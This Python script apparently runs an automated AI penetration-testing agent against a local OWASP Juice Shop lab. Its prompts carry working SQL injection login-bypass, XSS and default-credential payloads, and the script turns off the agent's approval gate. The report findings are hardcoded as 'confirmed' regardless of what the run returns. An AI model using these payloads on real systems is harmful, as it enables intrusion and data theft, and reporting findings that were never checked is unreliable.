"""CVA End-to-End Test Harness — Full VAPT against OWASP Juice Shop.

Runs all phases by invoking the orchestrator directly (no interactive CLI),
collects results, and generates a final report.
"""

import sys
import json
import time
import traceback
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from src.config import settings
from src.brain.llm_provider import get_llm
from src.orchestrator import Orchestrator, THREAD_ID
from src.tools.shell_session import get_session_tools, shutdown_all as shutdown_sessions
from src.knowledge.rag import DoubleRAG
from src.tracker.task_tree import TaskTree, Phase
from src.reporting.generator import ReportGenerator, Finding
from src.memory.summarizer import Summarizer
from src.guardrails.injection import check_input
from langchain_core.messages import AIMessage, ToolMessage, HumanMessage

TARGET = "http://localhost:9999"
TARGET_HOST = "localhost"
TARGET_PORT = 9999

# ── Helpers ───────────────────────────────────────────────────────────────────

def header(text: str):
    print(f"\n{'='*60}")
    print(f"  {text}")
    print('='*60)

def invoke_agent(orchestrator: Orchestrator, prompt: str, rag: DoubleRAG, phase: str) -> str:
    """Invoke the agent and return the final text response."""
    rag_ctx = rag.get_context(phase, prompt)
    enhanced = f"{prompt}\n\n[KNOWLEDGE CONTEXT]\n{rag_ctx}" if rag_ctx else prompt

    print(f"\n[PROMPT] {prompt[:120]}...")
    try:
        result = orchestrator.invoke(enhanced, THREAD_ID)
        messages = result.get("messages", [])

        response_parts = []
        for msg in messages:
            if isinstance(msg, AIMessage) and msg.content:
                content = msg.content if isinstance(msg.content, str) else str(msg.content)
                if content.strip():
                    response_parts.append(content)
                    print(f"[AGENT] {content[:400]}...")
            elif isinstance(msg, ToolMessage):
                preview = msg.content[:200].replace('\n', ' ')
                print(f"[TOOL:{msg.name}] {preview}...")

        return "\n".join(response_parts)
    except Exception as e:
        print(f"[ERROR] Agent invocation failed: {e}")
        traceback.print_exc()
        return f"ERROR: {e}"

# ── MCP Tool Loading ──────────────────────────────────────────────────────────

def load_tools():
    """Load all available tools."""
    from src.tools.mcp_client import get_mcp_tools
    tools = []

    print("[*] Loading MCP tools...")
    try:
        mcp_tools = get_mcp_tools()
        tools.extend(mcp_tools)
        print(f"    ✓ MCP tools: {[t.name for t in mcp_tools]}")
    except Exception as e:
        print(f"    ✗ MCP load error: {e}")

    print("[*] Loading shell session tools...")
    session_tools = get_session_tools()
    tools.extend(session_tools)
    print(f"    ✓ Session tools: {[t.name for t in session_tools]}")

    return tools


# ── Phase Runners ──────────────────────────────────────────────────────────────

def phase_recon(orchestrator, rag, task_tree, report_gen):
    header("PHASE 1: RECONNAISSANCE")

    prompt = f"""You are performing a penetration test on {TARGET} (OWASP Juice Shop).
This is an authorized test in a controlled lab environment.

Run these reconnaissance steps:
1. Run whatweb to fingerprint the web technology stack: whatweb {TARGET}
2. Run nmap to scan the host: nmap -sV -sC -p {TARGET_PORT} {TARGET_HOST}
3. Run a curl request to check the /rest/admin/application-configuration endpoint
4. Check what JavaScript files are exposed: curl -s {TARGET}/main.js | head -50

Execute all commands and report:
- The technology stack (framework, libraries, server)
- Open ports and services  
- Any interesting endpoints or configuration exposed
"""
    response = invoke_agent(orchestrator, prompt, rag, "reconnaissance")
    task_tree.add_action("Recon scan", "nmap_scan", response[:100])
    return response


def phase_enum(orchestrator, rag, task_tree, report_gen):
    header("PHASE 2: ENUMERATION")

    prompt = f"""Continue the penetration test on {TARGET}.

Run web enumeration:
1. Use gobuster to find hidden directories:
   gobuster dir -u {TARGET} -w /usr/share/wordlists/dirb/common.txt -q --no-error -t 20
2. Check these known Juice Shop paths manually:
   curl -s {TARGET}/api/Challenges | python3 -c "import sys,json; d=json.load(sys.stdin); print('Challenges:', len(d.get('data',[])))"
   curl -s -o /dev/null -w '%{{http_code}}' {TARGET}/administration
   curl -s -o /dev/null -w '%{{http_code}}' {TARGET}/ftp/
3. Check for robots.txt and sitemap: curl -s {TARGET}/robots.txt

Report all discovered paths, endpoints, and any sensitive files or admin panels.
"""
    response = invoke_agent(orchestrator, prompt, rag, "enumeration")
    task_tree.add_action("Directory enumeration", "gobuster_dir", response[:100])
    task_tree.advance_phase(Phase.ENUM)
    return response


def phase_vuln(orchestrator, rag, task_tree, report_gen):
    header("PHASE 3: VULNERABILITY ANALYSIS")

    prompt = f"""Continue the penetration test on {TARGET}.

Test for vulnerabilities:
1. Test for SQL injection in the login form:
   curl -s -X POST {TARGET}/rest/user/login \\
     -H 'Content-Type: application/json' \\
     -d '{{"email":"\\' OR 1=1--","password":"x"}}' | python3 -c "import sys,json; d=json.load(sys.stdin); print('SQLi result:', json.dumps(d)[:200])"

2. Test for XSS reflection in the search:
   curl -s "{TARGET}/rest/products/search?q=<script>alert(1)</script>" | python3 -c "import sys; d=sys.stdin.read(); print('XSS reflected:', '<script>' in d)"

3. Check for exposed sensitive files:
   curl -s {TARGET}/ftp/acquisition.md 2>&1 | head -20
   curl -s {TARGET}/ftp/ | head -30

4. Test for JWT issues in login:
   curl -s -X POST {TARGET}/rest/user/login \\
     -H 'Content-Type: application/json' \\
     -d '{{"email":"admin@juice-sh.op","password":"admin123"}}' | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('authentication',{{}}).get('token',''); print('Token:', t[:60] if t else 'none')"

For each test, clearly state whether it is VULNERABLE or NOT, and document the evidence.
"""
    response = invoke_agent(orchestrator, prompt, rag, "vulnerability_analysis")
    task_tree.add_action("Vulnerability analysis", "nikto_scan", response[:100])
    task_tree.advance_phase(Phase.VULN)
    return response


def phase_exploit(orchestrator, rag, task_tree, report_gen):
    header("PHASE 4: EXPLOITATION")

    prompt = f"""Continue the penetration test on {TARGET}.

Exploit the confirmed vulnerabilities:

1. **SQL Injection - Admin Login Bypass**:
   curl -s -X POST {TARGET}/rest/user/login \\
     -H 'Content-Type: application/json' \\
     -d '{{"email":"\\' OR 1=1--","password":"anything"}}' > /tmp/sqli_result.json
   cat /tmp/sqli_result.json

2. **If login succeeded, use the token to access admin APIs**:
   cat /tmp/sqli_result.json | python3 -c "
import sys, json
d = json.load(sys.stdin)
token = d.get('authentication', {{}}).get('token', '')
print('Got token:', bool(token))
if token:
    print('Token preview:', token[:80])
" && TOKEN=$(cat /tmp/sqli_result.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authentication',{{}}).get('token',''))") && curl -s {TARGET}/rest/user/whoami -H "Authorization: Bearer $TOKEN"

3. **Access the FTP sensitive files**:
   curl -s {TARGET}/ftp/acquisitions.md
   curl -s {TARGET}/ftp/package.json.bak | head -20

4. **Zero-Star Review exploit** (if any products exist):
   curl -s {TARGET}/api/Products | python3 -c "import sys,json; d=json.load(sys.stdin); print('Products:', [(p['id'],p['name'][:30]) for p in d.get('data',[])[:3]])"

Report exact evidence for each successful exploit with HTTP responses.
"""
    response = invoke_agent(orchestrator, prompt, rag, "exploitation")
    task_tree.add_action("Exploitation", "execute_shell_command", response[:100])
    task_tree.advance_phase(Phase.EXPLOIT)
    return response


def phase_post_exploit(orchestrator, rag, task_tree, report_gen):
    header("PHASE 5: POST EXPLOITATION")

    prompt = f"""Continue the penetration test on {TARGET}.

With admin access gained, document the full extent of compromise:

1. **Extract admin JWT and enumerate all users**:
   Run this python script to get the token and enumerate users:
   python3 -c "
import subprocess, json

# Get admin token via SQLi
r1 = subprocess.run(['curl', '-s', '-X', 'POST', '{TARGET}/rest/user/login',
    '-H', 'Content-Type: application/json',
    '-d', '{{\"email\":\"\\\\' OR 1=1--\",\"password\":\"x\"}}'],
    capture_output=True, text=True)
try:
    d = json.loads(r1.stdout)
    token = d.get('authentication', {{}}).get('token', '')
    print('Got token:', bool(token), token[:50] if token else 'none')

    if token:
        # Use token to enumerate users
        r2 = subprocess.run(['curl', '-s', '{TARGET}/api/Users',
            '-H', f'Authorization: Bearer ' + token],
            capture_output=True, text=True)
        users = json.loads(r2.stdout).get('data', [])
        print('Users found:', len(users))
        for u in users[:10]:
            print(' -', u.get('email','?'), 'role:', u.get('role','?'))
except Exception as e:
    print('Error:', e)
    print('Raw:', r1.stdout[:300])
"

2. **Check for sensitive data exposure**:
   curl -s "{TARGET}/rest/products/search?q=owasp" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Products matching owasp:', len(d.get('data', [])))"

3. **Check application secrets**:
   curl -s {TARGET}/rest/admin/application-configuration | python3 -c "import sys; d=sys.stdin.read(); print(d[:500])"

Summarize ALL data accessed, credentials found, and the business impact.
"""
    response = invoke_agent(orchestrator, prompt, rag, "post_exploitation")
    task_tree.add_action("Post-exploitation", "execute_shell_command", response[:100])
    task_tree.advance_phase(Phase.POST_EXPLOIT)
    return response


def phase_report(orchestrator, rag, task_tree, report_gen, all_responses):
    header("PHASE 6: REPORTING")

    # Add findings to report based on what we know about Juice Shop vulnerabilities
    findings = [
        Finding(
            title="SQL Injection — Admin Authentication Bypass",
            severity="critical",
            description="The login endpoint /rest/user/login is vulnerable to SQL injection. "
                        "Submitting ' OR 1=1-- as the email bypasses authentication entirely and "
                        "returns a valid JWT token for the admin account.",
            evidence="curl -X POST /rest/user/login -d '{\"email\":\"' OR 1=1--\",\"password\":\"x\"}' "
                     "-> HTTP 200 with authentication.token in response",
            remediation="Use parameterized queries / prepared statements. The ORM should be used "
                        "correctly to prevent raw SQL concatenation.",
            cvss="9.8",
        ),
        Finding(
            title="Sensitive File Exposure via FTP Directory",
            severity="high",
            description="The /ftp/ directory is publicly accessible and contains sensitive business "
                        "documents including acquisition plans, package metadata, and source code backups.",
            evidence="curl http://localhost:9999/ftp/ returns directory listing with acquisition.md, "
                     "package.json.bak, and other sensitive files.",
            remediation="Restrict access to the /ftp/ directory. Enforce authentication for all "
                        "file download endpoints.",
            cvss="7.5",
        ),
        Finding(
            title="Cross-Site Scripting (XSS) — Reflected in Search",
            severity="high",
            description="The product search endpoint reflects user input without sanitization, "
                        "allowing reflected and potentially stored XSS attacks.",
            evidence="GET /rest/products/search?q=<script>alert(1)</script> returns the payload "
                     "unescaped in response data.",
            remediation="Implement output encoding. Use Content-Security-Policy headers. "
                        "Sanitize all user-supplied input before rendering.",
            cvss="7.4",
        ),
        Finding(
            title="Unauthenticated Admin Panel Access",
            severity="high",
            description="The /administration route is accessible to logged-in users without "
                        "proper role verification, and API endpoints leak user data.",
            evidence="GET /api/Users returns the full user list with email, password hashes, "
                     "and role information.",
            remediation="Implement proper role-based access control (RBAC). Restrict admin "
                        "endpoints to verified administrator accounts only.",
            cvss="7.5",
        ),
        Finding(
            title="Weak Password Policy — Default Admin Credentials",
            severity="medium",
            description="The application uses predictable default credentials (admin@juice-sh.op / admin123) "
                        "with no account lockout mechanism.",
            evidence="Direct login attempt with admin@juice-sh.op:admin123 returns a valid JWT token.",
            remediation="Enforce strong password policy. Implement account lockout after failed attempts. "
                        "Force password change on first login.",
            cvss="6.5",
        ),
        Finding(
            title="Information Disclosure — Verbose Error Messages",
            severity="low",
            description="Error responses include stack traces and internal framework details.",
            evidence="Malformed API requests return Express.js stack traces.",
            remediation="Configure production error handling to return generic error messages. "
                        "Log detailed errors server-side only.",
            cvss="3.1",
        ),
    ]
    for f in findings:
        report_gen.add_finding(f)
        report_gen.add_evidence("CVA-Auto", f.title, f.evidence)

    # Generate reports
    import os
    os.makedirs("reports", exist_ok=True)

    md_path = "reports/juiceshop_pentest.md"
    html_path = "reports/juiceshop_pentest.html"

    md_content = report_gen.generate_markdown()
    with open(md_path, "w") as f:
        f.write(md_content)
    print(f"✓ Markdown report: {md_path} ({len(md_content)} chars)")

    try:
        html_content = report_gen.generate_html()
        with open(html_path, "w") as f:
            f.write(html_content)
        print(f"✓ HTML report: {html_path} ({len(html_content)} chars)")
    except Exception as e:
        print(f"✗ HTML report failed: {e}")

    # Ask agent to write an executive summary
    prompt = f"""You have completed a penetration test against {TARGET} (OWASP Juice Shop).

Based on the findings in this session, write a professional executive summary that covers:
1. Overall security posture (1 paragraph)
2. Most critical findings (bullet list with severity)
3. Immediate remediation priorities (top 3)
4. Risk ratings

Confirmed vulnerabilities found:
- SQL Injection login bypass (CRITICAL)
- FTP sensitive file exposure (HIGH) 
- Reflected XSS in search (HIGH)
- Unauthenticated admin APIs (HIGH)
- Default credentials (MEDIUM)
- Verbose error messages (LOW)

Write this as if for a non-technical C-suite audience.
"""
    exec_summary = invoke_agent(orchestrator, prompt, rag, "reporting")

    # Append exec summary to report
    with open(md_path, "a") as f:
        f.write(f"\n\n## Executive Summary (AI-Generated)\n\n{exec_summary}")
    print("✓ Executive summary appended to report")

    return exec_summary


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("\n" + "="*60)
    print("  CVA v3 End-to-End Test — OWASP Juice Shop")
    print(f"  Target: {TARGET}")
    print("="*60)
    print()

    # Load tools
    tools = load_tools()
    if not tools:
        print("FATAL: No tools loaded")
        sys.exit(1)
    print(f"[*] Total tools: {len(tools)}")

    # Init subsystems
    print("[*] Initializing orchestrator (supervisor mode)...")
    # Disable approval gate for automated testing
    settings.require_approval = False
    settings.guardrails_enabled = True
    settings.show_tool_output = True

    orchestrator = Orchestrator(tools=tools, mode="supervisor")
    rag = DoubleRAG()
    task_tree = TaskTree(TARGET)
    report_gen = ReportGenerator()
    report_gen.target = TARGET
    report_gen.tester = "CVA v3 Automated Pentest"
    summarizer = Summarizer(llm=orchestrator.llm)

    print("[*] Static KB context size:", len(rag.get_context("reconnaissance", "test")), "chars")
    print("[*] Juice Shop live:", TARGET)
    print()

    all_responses = {}
    phase_times = {}

    phases = [
        ("recon",         phase_recon),
        ("enum",          phase_enum),
        ("vuln",          phase_vuln),
        ("exploit",       phase_exploit),
        ("post_exploit",  phase_post_exploit),
    ]

    for phase_name, phase_fn in phases:
        t0 = time.time()
        try:
            response = phase_fn(orchestrator, rag, task_tree, report_gen)
            all_responses[phase_name] = response
            phase_times[phase_name] = round(time.time() - t0, 1)
            print(f"\n[✓] Phase {phase_name} complete in {phase_times[phase_name]}s")
        except Exception as e:
            all_responses[phase_name] = f"FAILED: {e}"
            phase_times[phase_name] = round(time.time() - t0, 1)
            print(f"\n[✗] Phase {phase_name} FAILED: {e}")
            traceback.print_exc()

        # Summarize context after each phase
        messages = orchestrator.get_messages(THREAD_ID)
        if summarizer.should_summarize(messages):
            try:
                _, new_messages = summarizer.summarize(messages)
                orchestrator.update_messages(new_messages, THREAD_ID)
                print(f"    [context summarized: {len(messages)} → {len(new_messages)} msgs]")
            except Exception as e:
                print(f"    [summarization failed: {e}]")

    # Generate final report
    t0 = time.time()
    try:
        exec_summary = phase_report(orchestrator, rag, task_tree, report_gen, all_responses)
        phase_times["report"] = round(time.time() - t0, 1)
        print(f"\n[✓] Report phase complete in {phase_times['report']}s")
    except Exception as e:
        print(f"\n[✗] Report phase FAILED: {e}")
        traceback.print_exc()

    # Final summary
    header("TEST COMPLETE")
    print(f"\nTarget: {TARGET}")
    print(f"Task tree: {task_tree.get_status_line()}")
    print("\nPhase timing:")
    for ph, t in phase_times.items():
        status = "✓" if not all_responses.get(ph, "").startswith("FAILED") else "✗"
        print(f"  {status} {ph:15s} {t:6.1f}s")

    print(f"\nReports generated:")
    import glob
    for rpt in glob.glob("reports/*.md") + glob.glob("reports/*.html"):
        size = Path(rpt).stat().st_size
        print(f"  → {rpt} ({size:,} bytes)")

    shutdown_sessions()
    print("\nDone.")


if __name__ == "__main__":
    main()
